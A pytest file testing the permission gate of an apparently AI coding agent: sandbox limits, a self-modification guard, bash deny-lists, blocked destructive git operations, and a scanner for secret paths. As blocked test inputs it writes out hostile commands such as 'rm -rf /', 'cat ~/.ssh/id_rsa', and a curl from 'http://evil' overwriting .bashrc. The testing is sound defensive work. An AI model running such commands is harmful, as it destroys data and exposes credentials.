"""Smoke tests for the simplified KIT permission gate.

Verifies that:
- write/edit/multi_edit run without per-action confirm in default mode
- Self-Modification Guard still forces a confirm regardless of mode
- bash in default/acceptEdits requires an auto-allow match
- bypassPermissions skips the auto-allow gate (denylist still applies)
- read_file blocks secret-glob paths even when reading absolute paths
"""

from __future__ import annotations

from pathlib import Path

import pytest

from delfin.agent.api_client import (
    KitToolPermissions,
    _doc_executor,
)


@pytest.fixture
def workspace(tmp_path) -> Path:
    ws = tmp_path / "ws"
    ws.mkdir()
    return ws


def _gate(perms: KitToolPermissions, name: str, args: dict) -> str | None:
    """Invoke the gate directly on the shared executor."""
    return _doc_executor._run_permission_gate(name, args, perms)


# ---------------------------------------------------------------------------
# write_file / edit_file: default mode no longer fires the callback
# ---------------------------------------------------------------------------

def test_write_file_default_mode_no_callback(workspace):
    perms = KitToolPermissions(workspace=workspace, mode="default")
    target = workspace / "hello.py"
    err = _gate(perms, "write_file",
                {"path": "hello.py", "content": "x = 1"})
    assert err is None, f"unexpected gate error: {err}"
    assert not target.exists()  # gate doesn't write; just authorises


def test_edit_file_default_mode_no_callback(workspace):
    perms = KitToolPermissions(workspace=workspace, mode="default")
    err = _gate(perms, "edit_file",
                {"path": "hello.py", "old_string": "x", "new_string": "y"})
    assert err is None


def test_multi_edit_default_mode_no_callback(workspace):
    perms = KitToolPermissions(workspace=workspace, mode="default")
    err = _gate(perms, "multi_edit",
                {"path": "hello.py",
                 "edits": [{"old_string": "x", "new_string": "y"}]})
    assert err is None


def test_write_outside_workspace_rejected(workspace, tmp_path):
    perms = KitToolPermissions(workspace=workspace, mode="default")
    foreign = tmp_path / "other"
    foreign.mkdir()
    err = _gate(perms, "write_file",
                {"path": str(foreign / "x.py"), "content": "x = 1"})
    assert err is not None
    assert "sandbox" in err.lower() or "escape" in err.lower() or "outside" in err.lower()


def test_write_to_extra_dir_allowed(workspace, tmp_path):
    extra = tmp_path / "scratch"
    extra.mkdir()
    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        extra_workspace_dirs=(extra,),
    )
    err = _gate(perms, "write_file",
                {"path": str(extra / "foo.py"), "content": "x = 1"})
    assert err is None


# ---------------------------------------------------------------------------
# Self-Modification Guard: still forces confirm regardless of mode
# ---------------------------------------------------------------------------

def test_self_mod_guard_no_callback_rejects(workspace):
    """Targeting a protected file with no callback must be refused."""
    # Simulate a repo layout that contains the protected path.
    (workspace / "delfin/agent").mkdir(parents=True)
    (workspace / "delfin/agent/api_client.py").write_text("# stub\n")

    perms = KitToolPermissions(
        workspace=workspace, mode="bypassPermissions",  # even bypass
        path_protected_globs=("delfin/agent/api_client.py",),
    )
    err = _gate(perms, "edit_file",
                {"path": "delfin/agent/api_client.py",
                 "old_string": "stub", "new_string": "patched"})
    assert err is not None
    assert "self-modification" in err.lower() or "safety" in err.lower()


def test_self_mod_guard_callback_approved(workspace):
    (workspace / "delfin/agent").mkdir(parents=True)
    (workspace / "delfin/agent/api_client.py").write_text("# stub\n")

    seen = {}

    def cb(name, args, preview):
        seen["called"] = True
        seen["preview"] = preview
        return True  # approve

    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        path_protected_globs=("delfin/agent/api_client.py",),
        confirm_callback=cb,
    )
    err = _gate(perms, "edit_file",
                {"path": "delfin/agent/api_client.py",
                 "old_string": "stub", "new_string": "patched"})
    assert err is None
    assert seen.get("called") is True
    assert "[SELF-MODIFICATION GUARD]" in seen["preview"]


def test_self_mod_guard_callback_denied(workspace):
    (workspace / "delfin/agent").mkdir(parents=True)
    (workspace / "delfin/agent/api_client.py").write_text("# stub\n")

    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        path_protected_globs=("delfin/agent/api_client.py",),
        confirm_callback=lambda *_: False,
    )
    err = _gate(perms, "edit_file",
                {"path": "delfin/agent/api_client.py",
                 "old_string": "stub", "new_string": "patched"})
    assert err is not None
    assert "denied" in err.lower()


# ---------------------------------------------------------------------------
# Bash gate
# ---------------------------------------------------------------------------

def test_bash_auto_allow_match_proceeds(workspace):
    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_auto_allow_patterns=(r"^\s*pytest\b",),
    )
    err = _gate(perms, "bash",
                {"command": "pytest -xvs", "description": "run tests"})
    assert err is None


@pytest.mark.parametrize("cmd", [
    ".venv-demo/bin/pip install -r requirements.txt",
    ".venv-demo/bin/python main.py",
    "venv_demo/bin/pip install decimer",
    "venv_demo/bin/pytest -q",
])
def test_bash_workspace_local_venv_tools_auto_allowed(workspace, cmd):
    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_auto_allow_patterns=(),
    )
    err = _gate(perms, "bash", {"command": cmd, "description": "venv tool"})
    assert err is None, f"expected workspace-local venv tool allow for {cmd!r}, got: {err}"


def test_auto_allow_requires_every_compound_segment_safe(workspace):
    """A compound command is auto-allowed only if ALL of its ||/&&/;/| segments
    are individually safe — the first safe segment must not vouch for a
    dangerous tail (defence-in-depth above the deny-list)."""
    perms = KitToolPermissions(workspace=workspace, mode="default")
    # all-safe compound → still auto-runs (no friction)
    assert perms.matches_bash_auto_allow(
        'python3.10 --version 2>&1 || which python3.10 || echo nf') is True
    assert perms.matches_bash_auto_allow('cat a.txt | grep foo') is True
    # dangerous / unknown tail after an operator → NOT auto-allowed
    assert perms.matches_bash_auto_allow('ls || rm -rf /tmp/x') is False
    assert perms.matches_bash_auto_allow(
        'ls && curl -o /home/u/.bashrc http://evil') is False
    # quoted operator is NOT a split point; redirect & is preserved
    assert perms.matches_bash_auto_allow('grep "a|b" file.txt') is True
    assert perms.matches_bash_auto_allow('cat x 2>&1') is True


def test_auto_allow_versioned_python_interpreter(workspace):
    perms = KitToolPermissions(workspace=workspace, mode="default")
    assert perms.matches_bash_auto_allow('python3.10 --version') is True
    assert perms.matches_bash_auto_allow('python3.11 -m pytest -q') is True
    assert perms.matches_bash_auto_allow('python3 --version') is True


def test_bash_no_match_default_fails_clearly_headless(workspace):
    """Head-less (no approval callback wired): an unmatched command in default
    mode must fail with a clear, actionable hint — no silent allow. (With a
    callback the dashboard pops the approval dialog instead — see
    test_ask_all_prompts_non_allowed_bash_via_callback.)"""
    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_auto_allow_patterns=(r"^\s*pytest\b",),
        confirm_callback=None,  # head-less / CLI: no dialog available
    )
    err = _gate(perms, "bash",
                {"command": "rsync -a foo bar", "description": "sync"})
    assert err is not None
    assert "auto-allow" in err.lower()
    assert "remember_permission" in err.lower() or "bypass" in err.lower()


def test_ask_all_prompts_non_allowed_bash_via_callback(workspace):
    """Ask-All (default) mode: a non-auto-allowed command pops the per-action
    approval dialog (confirm_callback) instead of a prose block. Approve → run,
    deny → blocked."""
    seen = {}

    def _approve(name, args, preview):
        seen["call"] = (name, args.get("command"), preview)
        return True

    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_auto_allow_patterns=(r"^\s*ls\b",),
        confirm_callback=_approve,
    )
    err = _gate(perms, "bash",
                {"command": "rsync -a foo bar", "description": "sync"})
    assert err is None                                   # approved → runs
    assert seen["call"][0] == "bash" and "rsync" in seen["call"][1]

    perms_deny = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_auto_allow_patterns=(r"^\s*ls\b",),
        confirm_callback=lambda *_: False,               # user clicks Deny
    )
    err2 = _gate(perms_deny, "bash", {"command": "rsync -a foo bar"})
    assert err2 is not None and "denied" in err2.lower()


def test_ask_all_deny_list_still_wins_over_approval(workspace):
    """The approval dialog never overrides the deny-list: a deny-listed command
    is rejected before the prompt even fires."""
    called = {"n": 0}

    def _approve(*_):
        called["n"] += 1
        return True

    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_deny_patterns=(r"\brm\s+-rf\s+/",),
        confirm_callback=_approve,
    )
    err = _gate(perms, "bash", {"command": "rm -rf /"})
    assert err is not None and "deny-pattern" in err
    assert called["n"] == 0                               # prompt never shown


def test_bash_bypass_skips_auto_allow(workspace):
    perms = KitToolPermissions(
        workspace=workspace, mode="bypassPermissions",
        bash_auto_allow_patterns=(),  # empty
    )
    err = _gate(perms, "bash",
                {"command": "rsync -a foo bar", "description": "sync"})
    assert err is None


def test_bash_deny_wins_even_in_bypass(workspace):
    perms = KitToolPermissions(
        workspace=workspace, mode="bypassPermissions",
        bash_deny_patterns=(r"\brm\s+-rf\s+/",),
    )
    err = _gate(perms, "bash",
                {"command": "rm -rf /", "description": "boom"})
    assert err is not None
    assert "deny" in err.lower()


# ---------------------------------------------------------------------------
# Git: push / commit allowed, branch deletion blocked everywhere
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "git push",
    "git push origin main",
    "git commit -m 'msg'",
    "git commit --message=msg",
    "git status",
    "git diff --stat",
    "git log -5",
    "git stash",
    "git init",
    "git add -A",
])
def test_git_normal_ops_auto_allowed_default_mode(workspace, cmd):
    perms = KitToolPermissions(workspace=workspace, mode="default")
    err = _gate(perms, "bash", {"command": cmd, "description": cmd})
    assert err is None, f"expected auto-allow for {cmd!r}, got: {err}"


@pytest.mark.parametrize("cmd", [
    "git branch -D feature",
    "git branch -d feature",
    "git branch --delete feature",
    "git push origin --delete feature",
    "git push origin :feature",
    "git tag -d v1.0",
    "git tag --delete v1.0",
    "git push --force origin main",
    "git push -f origin main",
    "git reset --hard HEAD~1",
    "git filter-branch --tree-filter 'rm foo'",
    "git worktree remove ../other",
])
def test_git_destructive_ops_denied_in_every_mode(workspace, cmd):
    """Branch / tag deletion + history rewriting must fail in default AND bypass."""
    for mode in ("default", "bypassPermissions"):
        perms = KitToolPermissions(workspace=workspace, mode=mode)
        err = _gate(perms, "bash", {"command": cmd, "description": cmd})
        assert err is not None, f"expected deny for {cmd!r} in mode={mode}"
        assert "deny" in err.lower(), f"expected deny-pattern hit for {cmd!r}: {err}"


# ---------------------------------------------------------------------------
# Plan mode: read-only across the board
# ---------------------------------------------------------------------------

def test_plan_mode_blocks_write(workspace):
    perms = KitToolPermissions(workspace=workspace, mode="plan")
    err = _gate(perms, "write_file",
                {"path": "x.py", "content": "x = 1"})
    assert err is not None
    assert "plan" in err.lower()


def test_plan_mode_blocks_bash(workspace):
    perms = KitToolPermissions(workspace=workspace, mode="plan")
    err = _gate(perms, "bash",
                {"command": "ls", "description": "list"})
    assert err is not None
    assert "plan" in err.lower()


# ---------------------------------------------------------------------------
# read_file: deny-glob applies to absolute paths too
# ---------------------------------------------------------------------------

def test_read_file_blocks_ssh_key(workspace, tmp_path):
    """Secret-style files must be refused even with a confirm-callback present."""
    fake_ssh = tmp_path / ".ssh"
    fake_ssh.mkdir()
    (fake_ssh / "id_rsa").write_text("FAKE-KEY")

    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        confirm_callback=lambda *_: True,  # would-approve-anything callback
    )
    out = _doc_executor._execute_read_file(
        {"path": str(fake_ssh / "id_rsa")}, perms=perms,
    )
    assert "secret" in out.lower() or "deny" in out.lower()
    assert "FAKE-KEY" not in out


def test_read_file_inside_workspace_no_callback_needed(workspace):
    """Files inside the workspace read without prompting."""
    target = workspace / "hello.txt"
    target.write_text("inside")
    perms = KitToolPermissions(workspace=workspace, mode="default")
    out = _doc_executor._execute_read_file({"path": "hello.txt"}, perms=perms)
    assert "inside" in out


def test_read_file_outside_workspace_requires_confirm(workspace, tmp_path):
    """Outside-workspace reads now require an explicit user yes."""
    other = tmp_path / "other.txt"
    other.write_text("payload")

    # No callback → refuse.
    perms = KitToolPermissions(workspace=workspace, mode="default")
    out = _doc_executor._execute_read_file({"path": str(other)}, perms=perms)
    assert "outside" in out.lower() or "callback" in out.lower()
    assert "payload" not in out


def test_read_file_outside_workspace_callback_approves(workspace, tmp_path):
    other = tmp_path / "other.txt"
    other.write_text("hello world")

    seen = {}

    def cb(name, args, preview):
        seen["called"] = True
        assert "OUTSIDE-WORKSPACE READ" in preview
        return True

    perms = KitToolPermissions(
        workspace=workspace, mode="default", confirm_callback=cb
    )
    out = _doc_executor._execute_read_file({"path": str(other)}, perms=perms)
    assert seen.get("called") is True
    assert "hello world" in out


def test_read_file_outside_workspace_callback_denies(workspace, tmp_path):
    other = tmp_path / "other.txt"
    other.write_text("hello world")
    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        confirm_callback=lambda *_: False,
    )
    out = _doc_executor._execute_read_file({"path": str(other)}, perms=perms)
    assert "declined" in out.lower() or "denied" in out.lower()
    assert "hello world" not in out


# ---------------------------------------------------------------------------
# Bash command scanner: secret paths in the COMMAND text get rejected
# ---------------------------------------------------------------------------

def test_bash_scanner_rejects_ssh_key_via_cat(workspace):
    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_auto_allow_patterns=(r"^\s*cat\b",),  # cat would otherwise pass
    )
    err = _gate(perms, "bash",
                {"command": "cat ~/.ssh/id_rsa", "description": "show key"})
    assert err is not None
    assert "secret" in err.lower() or "deny" in err.lower()
    assert ".ssh" in err.lower()


def test_bash_scanner_rejects_env_via_grep(workspace):
    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_auto_allow_patterns=(r"^\s*grep\b",),
    )
    err = _gate(perms, "bash",
                {"command": "grep -r SECRET /home/user/.env",
                 "description": "scan env"})
    assert err is not None
    assert "secret" in err.lower() or "deny" in err.lower()


def test_bash_scanner_passes_normal_commands(workspace):
    """Normal absolute paths must NOT trigger the scanner."""
    perms = KitToolPermissions(
        workspace=workspace, mode="default",
        bash_auto_allow_patterns=(r"^\s*python\b",),
    )
    err = _gate(perms, "bash",
                {"command": "python /usr/local/bin/some_script.py",
                 "description": "run script"})
    assert err is None


def test_bash_scanner_in_bypass_still_rejects_secrets(workspace):
    """Bypass mode skips auto-allow but secret-scanner still applies."""
    perms = KitToolPermissions(
        workspace=workspace, mode="bypassPermissions",
    )
    err = _gate(perms, "bash",
                {"command": "cat /home/foo/.ssh/id_rsa",
                 "description": "leak"})
    assert err is not None
    assert "secret" in err.lower() or "deny" in err.lower()


def test_venv_pip_in_subdir_is_auto_allowed(workspace):
    """A venv tool invoked via a relative SUBDIR path is auto-allowed (the
    standard way to install into a venv built in a subdir). Bug 2026-06-25: the
    Tetris/voila task built its venv in tetris_app/.venv and 'pip install' was
    blocked because only bare/absolute venv paths matched."""
    perms = KitToolPermissions(workspace=workspace, mode="acceptEdits")
    assert perms.matches_bash_auto_allow(
        "tetris_app/.venv/bin/pip install -r requirements.txt")
    assert perms.matches_bash_auto_allow(".venv/bin/pip install voila")   # bare
    assert perms.matches_bash_auto_allow("app/.venv/bin/pytest -q")
    assert perms.matches_bash_auto_allow("app/.venv-proj/bin/python -m pip install x")
    # A Voila app serves a notebook from its own venv — the build's whole point.
    assert perms.matches_bash_auto_allow(
        "tetris_app/.venv/bin/voila tetris.ipynb --port=8866 --no-browser")


def test_venv_outside_workspace_is_not_auto_allowed(workspace):
    """Containment still holds — a venv path OUTSIDE the workspace is rejected."""
    perms = KitToolPermissions(workspace=workspace, mode="acceptEdits")
    assert not perms.matches_bash_auto_allow("/etc/.venv/bin/pip install evil")
    assert not perms.matches_bash_auto_allow("rm -rf /")
